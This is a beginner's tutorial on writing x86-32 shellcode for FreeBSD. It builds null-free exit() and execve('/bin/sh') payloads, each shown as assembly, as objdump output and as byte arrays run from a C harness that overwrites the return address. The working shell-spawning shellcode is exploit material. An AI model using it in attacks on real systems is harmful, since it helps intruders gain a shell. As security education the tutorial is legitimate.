<p>A guide by Xwyzard on writing x86-32 shellcode on FreeBSD</p>

<p><strong>Introduction</strong></p>

<p>The purpose of this tutorial is to help familiarize you with creating shellcode on the FreeBSD operating system. While I endeavor to explain everything in here thoroughly, this paper is not meant to be a primer on assembly coding. In the disassemblies you will notice that the assembly code is in AT&#38;T syntax, while I much prefer to use Intel syntax (which is what nasm works on anyway). If you are concerned about the difference please do use google to find those differences. Please do note that I am just a beginner with shellcoding and that this is not meant, in any way, to be the end all, on the contrary this is meant to be an easy introduction for brand new shellcoders. In other words if you have written shellcodes, this is probably not going to interest you. The code within was adapted from linux code examples in The Shellcoders Handbook</p>

<p><strong>Resources I used:</strong></p>

<ul>
<li>Unix Systems Programming  http:&#47;&#47;vip.cs.utsa.edu&#47;usp&#47;<br/></li>
<li>The Shellcoders Handbook  http:&#47;&#47;www.wiley.com&#47;WileyCDA&#47;WileyAncillary&#47;productCd-0764544683,typeCd-NOTE.html<br/></li>
<li>FreeBSD Assembly Language Programming by G. Adam Stanislav  http:&#47;&#47;www.int80h.org&#47;bsdasm&#47;<br/></li>
</ul>

<p><strong>Required tools:</strong>  </p>

<ul>
<li>objdump<br/></li>
<li>NASM (Netwide Assembler)<br/></li>
<li>GCC<br/></li>
<li>gdb<br/></li>
</ul>

<p>Before we get started, lets save some time and grab a copy of &#47;usr&#47;src&#47;sys&#47;kern&#47;syscalls.master This is the list of syscalls and their related numeric value. It is handy to keep a copy in your coding directory to save time on going to it, besides if you accidentally open that up and make changes while logged in as root, bad things could happen. Let&#8217;s play it safe and grab a copy. </p>

<p>Now that we&#8217;ve gotten that out of the way let&#8217;s dive right in and I&#8217;ll explain things as we move along. The first shellcode we will do is an extremely simple one, it is for exit(). We start by creating the exit() in C code, this will allow us to analyze the disassembly so that we can rewrite it into asm. Compile this up: gcc -o myexit myexit.c  </p>

<pre><code>&#47;* As easy as it gets *&#47;  
#include
main()
{
exit(0); &#47;&#47; exit with "0" for successful exit
}
</code></pre>

<p>Now that we have the compiled code we want to have a peek at the internals using gdb. This will allow us to see the computers &#8220;opinion&#8221; on what our code looks like in assembly. Just do the steps as I state them: </p>

<pre><code>bash$ gdb myexit
(gdb) disas main
Dump of assembler code for function main:
0x80481d8
: push %ebp
0x80481d9 : mov %esp,%ebp
0x80481db : sub $0x8,%esp
0x80481de : add $0xfffffff4,%esp
0x80481e1 : push $0x0
0x80481e3 : call 0x80498dc 
0x80481e8 : add $0x10,%esp
0x80481eb : nop
0x80481ec : leave
0x80481ed : ret
End of assembler dump.
</code></pre>

<p>Let&#8217;s break this down piece by piece. First, go ahead and don&#8217;t worry about anything up to and including Also, don&#8217;t be concerned about the addresses as mine are most likely going to be different than yours. Now look at , this is the first important part for our uses. That is the one and only parameter passed to exit(). Next is the actual call to exit. Those are the two main things we need from that. Before we get into the code, lets check syscalls.master for the value of sys<em>exit() &#8216;grep&#8217;ping the file we find this line: 1 STD NOHIDE { void sys</em>exit(int rval); } exit sys<em>exit</em>args void The important information from that is 1 which is the syscall number value and the rval (return value) argument. This shows that sys_exit() takes one argument and we should know that a return value of &#8216;0&#8217; is a successful exit.</p>

<p>Ok, on to putting it into assembly code.</p>

<pre><code>section .text
global _start
_start:

xor eax, eax
push eax
push eax
mov eax, 1
int 80h
</code></pre>

<p>Take a look at the above code, now before we get into it much further a short explanation on why the code is done this way is in order. In FreeBSD (or NetBSD, OpenBSD) the parameters to a syscall are pushed onto the stack in reverse order, the actual syscall number placed into eax and then interrupt 80 to call the kernel to perform the work we setup. </p>

<p>Now to begin, we have &#8216;xor eax, eax&#8217; what this does is zero&#8217;s out eax in the case there were any values into it alread. Then we &#8216;push eax&#8217; twice. (I don&#8217;t know the technical reasons, but if zero is pushed onto the stack once, the exit call will return 1, we don&#8217;t want this, just push the zero value twice and save headaches.) Now we load up eax with the syscall value for exit which is 1. Last thing we must do is to actually call the kernel with &#8216;int 80h&#8217; </p>

<p>Great! Now we have something from which we can get shellcode! (Yes I know, finally!)</p>

<p>Alright well we need to assemble and then link this file.</p>

<pre><code>bash$ nasm -f elf myexit.asm
bash$ ld -s -o myexit myexit.o
</code></pre>

<p>Now that it is assembled and linked we use objdump to get the shellcode from.</p>

<pre><code>bash$ objdump -d myexit
shortexit: file format elf32-i386
&#47;usr&#47;libexec&#47;elf&#47;objdump: shortexit: no symbols
Disassembly of section .text:
08048080 &#60;.text&#62;:
8048080: 31 c0 xor %eax,%eax
8048082: 50 push %eax
8048083: 50 push %eax
8048084: b8 01 00 00 00 mov $0x1,%eax
8048089: cd 80 int $0x80
</code></pre>

<p>Looks beautiful doesn&#8217;t it? It might to someone, but it&#8217;s awful for us. Look at those NULLs in there (00), we can&#8217;t use that it will break as soon as we try to execute it in our C program. In C and in other languages, NULL will terminate a string. This means we are stuck like chuck if we try to load that into a C array. Well we can&#8217;t have that. There may be other ways to lean out this asm code, but I came up with this one. </p>

<pre><code>Section .text
global _start
_start:

xor eax, eax
push eax
push eax
inc eax
int 80h
</code></pre>

<p>The only thing different here is the &#8216;inc eax&#8217; this increments eax by 1 (remember eax started out at zero and we need 1 (exit syscall value) in it, so in this case it is identical to &#8216;mov eax, 1&#8217;.</p>

<p>Again, assemble and link this as shown on the last example and then use objdump.</p>

<pre><code>bash$ objdump -d myexit

&#47;usr&#47;libexec&#47;elf&#47;objdump: exit_shellcode: no symbols
Disassembly of section .text:

08048080 &#60;.text&#62;:
8048080: 31 c0 xor %eax,%eax
8048082: 50 push %eax
8048083: 50 push %eax
8048084: 40 inc %eax
8048085: cd 80 int $0x80
</code></pre>

<p>Look at that! No NULLs in it, that&#8217;s a good one and we are going to keep it!
Well now we have the proper shellcode with no NULLs in it, it is now time to load it up into a C program to execute it.</p>

<pre><code>#include 
#include 
&#47;*working shellcode *&#47;
char shellcode[] = "\x31\xc0\x50\x50\x40\xcd\x80";
int main()
{
int *ret;
ret = (int *)&#38;ret + 2;
(*ret) = (int)shellcode;
}
</code></pre>

<p>That&#8217;s it, looks really pretty too! Now to compile that:</p>

<pre><code>bash$ gcc -o shellcode shellcode.c
bash$ .&#47;shellcode ; echo $?
0
</code></pre>

<p>Since we couldn&#8217;t really see much with an exit, we did &#8216;echo $?&#8217;. &#8216;$?&#8217; is a bash builtin variable that holds the last exit code of a program. Since we gave exit &#8216;0&#8217; return value we see our code worked! Good job, your patience and work has finally paid off. That was just the beginning though and you would not likely have a use for this code.</p>

<p>Well as you may have guessed, shellcode that exits isn&#8217;t very interesting or useful, however it is nice and easy to show the major points of creating shellcode. Now is where we get into one of the more common shellcodes and that is to utilize execve() to spawn a shell. But what else could we do with execve()? Tons, but that doesn&#8217;t matter right now. Before we go anywhere with this though, we should consult syscalls.master so we know exactly what execve() expects. Since execve is not at the very beginning of the file this is how I found it.</p>

<pre><code>bash$ grep -i &#39;execve&#39; syscalls.master
59 STD POSIX { int execve(char *fname, char **argv, char **envv); }
</code></pre>

<p>Now since we are going to be calling execve with no arguments, we only need to know what the first argument is. This is a pointer
to the command we wish to execute. We will still need to keep the other arguments in mind since execve still expects to see them.
So we put this call into C code so we have something with which to figure out the assembly code for it.</p>

<pre><code>#include 
int main()
{
char *name[2];
name[0] = "&#47;bin&#47;sh";
name[1] = 0x0;
execve(name[0], name, 0x0);
}
</code></pre>

<p>Now compile that as we have shown and then fire up gdb:</p>

<pre><code>bash$ gdb shell
(gdb) disas main
Dump of assembler code for function main:
0x80484a0
: push %ebp
0x80484a1 : mov %esp,%ebp
0x80484a3 : sub $0x18,%esp
0x80484a6 : movl $0x8048503,0xfffffff8(%ebp)
0x80484ad : movl $0x0,0xfffffffc(%ebp)
0x80484b4 : add $0xfffffffc,%esp
0x80484b7 : push $0x0
0x80484b9 : lea 0xfffffff8(%ebp),%eax
0x80484bc : push %eax
0x80484bd : mov 0xfffffff8(%ebp),%eax
0x80484c0 : push %eax
0x80484c1 : call 0x8048350 
0x80484c6 : add $0x10,%esp
0x80484c9 : leave
0x80484ca : ret
0x80484cb : nop
End of assembler dump.
</code></pre>

<p>Wow that is alot to look at! </p>

<p>Since this one is so much longer, I will just skip to the code itself as the explanation should be clearer when you see the code. This is also why I am putting the explanation in the comments of this code.</p>

<pre><code>;don&#39;t worry why this is here other than that it is required
;by ld. Just put it in there.
section .text
global _start
_start:
;We do this so that we can get the address of db &#39;&#47;bin&#47;sh&#39; onto the stack
jmp short _callshell
_shellcode:
;This gets us the address of db &#39;&#47;bin&#47;sh&#39; into esi
pop esi
;ensure there are no values in eax
xor eax, eax
;now that eax is NULL, we will take a byte and put it to the end
;of the &#39;&#47;bin&#47;sh&#39; string to terminate it.
mov byte [esi + 7], al
;in freebsd assembly we put all the parameters onto the stack
;in reverse order. We are pushing eax twice which is null since we
;are not using execve() with parameters. However, this is still required
;by execve().
push eax
push eax
;last parameter for execve (note this is actually the first one required
;but this is reverse order.)
push esi
;Here&#39;s the actual syscall value for execve() we are moving it into
;al. If we were to put that value into eax we would get NULLs into
;our shellcode which is bad.
mov al, 0x3b 
;don&#39;t ask me why this is here, but it is required to have working shellcode
push eax 
;This is what will actually get the kernel involved and perform
;the work we have prepared for it above. note that this is interrupt 80h
int 0x80
_callshell:
;this takes us back up to the main portion of our code. The reason for
;this detour has been stated above for relative addresses.
call _shellcode
;our actual command string that will be fed into execve()
db &#39;&#47;bin&#47;sh&#39;
</code></pre>

<p>Now we assemble that file as so:</p>

<pre><code>bash$ nasm -f elf mynewshell.asm
bash$ ld -o mynewshell mynewshell.o
</code></pre>

<p>Then we fire up objdump:</p>

<pre><code>bash$ objdump -d mynewshell
mynewshell: file format elf32-i386
Disassembly of section .text:
08048080 &#60;_start&#62;:
8048080: eb 0e jmp 8048090 &#60;_callshell&#62;

08048082 &#60;_shellcode&#62;:
8048082: 5e pop %esi
8048083: 31 c0 xor %eax,%eax
8048085: 88 46 07 mov %al,0x7(%esi)
8048088: 50 push %eax
8048089: 50 push %eax
804808a: 56 push %esi
804808b: b0 3b mov $0x3b,%al
804808d: 50 push %eax
804808e: cd 80 int $0x80
08048090 &#60;_callshell&#62;:
8048090: e8 ed ff ff ff call 8048082 &#60;_shellcode&#62;
8048095: 2f das
8048096: 62 69 6e bound %ebp,0x6e(%ecx)
8048099: 2f das
804809a: 73 68 jae 8048104 &#60;_callshell+0x74&#62;
</code></pre>

<p>Have a look at all that beautiful shellcode. Now the tedious job of putting it into a usable format and right into a C program so that we can actually execute it.</p>

<pre><code>#include 
#include 
&#47;*working shellcode *&#47;
char shellcode[] = "\xeb\x0e\x5e\x31\xc0\x88\x46\x07\x50\x50\x56\xb0\x3b"
"\x50\xcd\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
int main()
{
int *ret;
ret = (int *)&#38;ret + 2;
(*ret) = (int)shellcode;
}
</code></pre>

<p>Compile it:</p>

<pre><code>bash$ gcc -o shell shell.c
bash$ .&#47;shell
$
</code></pre>

<p>It worked! We have made shellcode that spawns a shell. That took awhile to get to and while this is certainly not the end to what you can do with shell code, it should give you the confidence to read the other, more thorough, tutorials out there and begin messing with shellcode on your own. </p>

<p>Special thanks to mardukk&#47;push[eax] and int16h for their assistance on the more technical aspects that I was unsure of and to PrincesSoha for taking the time to edit and format my work far better than I could.</p>

]]></description>
</item>
</channel></rss>
